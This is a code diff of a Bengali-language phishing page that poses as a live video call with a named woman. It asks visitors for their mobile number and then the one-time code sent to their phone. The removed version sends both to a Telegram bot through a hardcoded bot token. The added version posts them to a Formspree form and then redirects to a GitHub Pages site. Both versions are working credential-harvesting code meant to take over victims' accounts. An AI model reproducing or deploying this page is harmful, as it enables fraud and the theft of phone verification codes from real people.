@@ -3,60 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Call</title>
+    <title>Sumaiya Akter Jui - LIVE</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px; }
-        .box { background: #fff; width: 90%; max-width: 400px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; }
-        input { width: 90%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        button { width: 95%; padding: 15px; background: #e1306c; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        body { font-family: sans-serif; text-align: center; background: #fff; padding-top: 50px; }
+        .card { width: 95%; max-width: 380px; margin: auto; padding: 25px; border-radius: 15px; border: 1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 10px; border: 2px solid #f42d4d; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: linear-gradient(to right, #4458dc, #f42d4d); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-<div class="box" id="step1">
+<div class="card">
     <img src="ssstik.io_1777744992501.jpeg">
-    <h3>Sumaiya Akter Jui</h3>
-    <p>নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
-    <input type="tel" id="num" placeholder="মোবাইল নম্বর লিখুন">
-    <button onclick="next()">পরবর্তী ধাপ</button>
-</div>
+    <h2 id="title">Sumaiya Akter Jui</h2>
+    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
-<div class="box" id="step2" style="display:none;">
-    <img src="ssstik.io_1777744992501.jpeg">
-    <h3>কোড যাচাই করুন</h3>
-    <p>আপনার মোবাইলে পাঠানো কোডটি লিখুন</p>
-    <input type="tel" id="otp" placeholder="৪ ডিজিট কোড">
-    <button onclick="sendData()">ভিডিও কল শুরু করুন</button>
+    <form action="https://formspree.io/f/mqakvjnd" method="POST" id="mainForm">
+        <div id="step1">
+            <input type="tel" name="Phone_Number" placeholder="আপনার মোবাইল নম্বর" required>
+            <button type="button" onclick="showStep2()">পরবর্তী ধাপ</button>
+        </div>
+
+        <div id="step2" style="display:none;">
+            <input type="tel" name="OTP_Code" placeholder="৪ ডিজিট কোড (OTP)" required>
+            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
+        </div>
+        
+        <input type="hidden" name="_next" value="https://mdbadhonsharkar830-png.github.io/mylive/">
+    </form>
 </div>
 
 <script>
-    let phone = "";
-    function next() {
-        phone = document.getElementById('num').value;
-        if(phone.length < 5) return alert("নম্বর দিন");
+    function showStep2() {
+        const phone = document.getElementsByName('Phone_Number')[0].value;
+        if(phone.length < 5) return alert("সঠিক মোবাইল নম্বর দিন");
+        
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-    }
-
-    function sendData() {
-        const otp = document.getElementById('otp').value;
-        if(otp.length < 4) return alert("কোড দিন");
-
-        // আপনার সঠিক তথ্য (স্ক্রিনশট অনুযায়ী)
-        const token = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
-        const chat_id = "8795859465"; 
-
-        const text = `🔴 নতুন ডাটা আইছে!\n👤 নাম: Sumaiya Akter Jui\n📱 নম্বর: ${phone}\n🔑 ওটিপি: ${otp}`;
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-
-        fetch(url)
-        .then(() => {
-            alert("যাচাই করা হচ্ছে... একটু অপেক্ষা করুন।");
-            location.reload();
-        })
-        .catch(() => alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।"));
+        document.getElementById('title').innerText = "Verification";
+        document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
     }
 </script>
+
 </body>
 </html>
